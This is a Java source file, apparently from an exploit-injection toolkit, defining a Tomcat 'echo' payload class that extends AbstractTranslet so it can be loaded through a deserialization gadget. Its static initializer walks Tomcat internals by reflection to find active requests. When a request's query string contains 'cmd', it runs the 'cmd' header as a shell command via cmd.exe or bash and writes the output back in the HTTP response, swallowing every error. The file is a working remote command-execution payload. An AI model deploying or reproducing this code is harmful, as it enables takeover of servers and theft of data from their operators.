package net.roboterh.injector.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;

import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;

public class TomcatEchoTemplate extends AbstractTranslet {

    public static Object getField(Object obj, Field field) {
        try {
            field.setAccessible(true);
            return field.get(obj);
        } catch (Exception e) {
        }
        return null;
    }

    static {
        try {
            // 从线程中获取类加载器WebappClassLoaderBase
            WebappClassLoaderBase contextClassLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            // 获取TomcatEmbeddedContext对象
            Context context = contextClassLoader.getResources().getContext();
            // 从上下文中获取ApplicationContext对象
            ApplicationContext applicationContext = (ApplicationContext) getField(context, Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context"));

            // 从Application中获取StandardService对象
            StandardService standardService = (StandardService) getField(applicationContext, Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service"));

            // 从StandardService中获取Connector数组
            Connector[] connectors = standardService.findConnectors();
            for (Connector connector : connectors) {
                if (connector.getScheme().toLowerCase().contains("http")) {
                    // 获取Connector对象的protocolHandler属性值
                    ProtocolHandler protocolHandler = connector.getProtocolHandler();
                    // 筛选我们需要的Abstract
                    if (protocolHandler instanceof AbstractProtocol) {
                        // 从Http11NioProtocol对象中获取到handler属性，也即是AbstractProtocol中的handler属性，存在有一个getHandler方法可以直接返回
                        // 反射获取该方法
                        Method getHandler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredMethod("getHandler");
                        getHandler.setAccessible(true);
                        AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) getHandler.invoke(protocolHandler);
                        // 从上面获取的handler中取出global属性值
                        RequestGroupInfo global = (RequestGroupInfo) getField(handler, Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global"));
                        // 之后从上面获取的RequestGroupInfo对象中获取到processors这个List对象，元素是RequestInfo对象
                        ArrayList processors = (ArrayList) getField(global, Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors"));
                        // 遍历List中的元素
                        for (Object processor : processors) {
                            RequestInfo requestInfo = (RequestInfo) processor;
                            // 获取对应的Request对象
                            org.apache.coyote.Request req = (org.apache.coyote.Request) getField(requestInfo, Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req"));
                            // 通过不同的请求进行处理
                            if ((req.queryString()).toString().toLowerCase().contains("cmd")) {
                                // 获取对应的Request对象
                                org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);
                                // 执行希望执行的命令
                                String cmd = request.getHeader("cmd");
                                String[] cmds = null;
                                if (cmd != null) {
                                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                                        cmds = new String[]{"cmd.exe", "/c", cmd};
                                    } else {
                                        cmds = new String[]{"/bin/bash", "-c", cmd};
                                    }
                                    java.util.Scanner c = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A");
                                    String o = null;
                                    o = c.hasNext() ? c.next() : o;
                                    c.close();
                                    PrintWriter writer = request.getResponse().getWriter();
                                    writer.println(o);
                                    writer.flush();
                                    writer.close();
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            // ignore
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
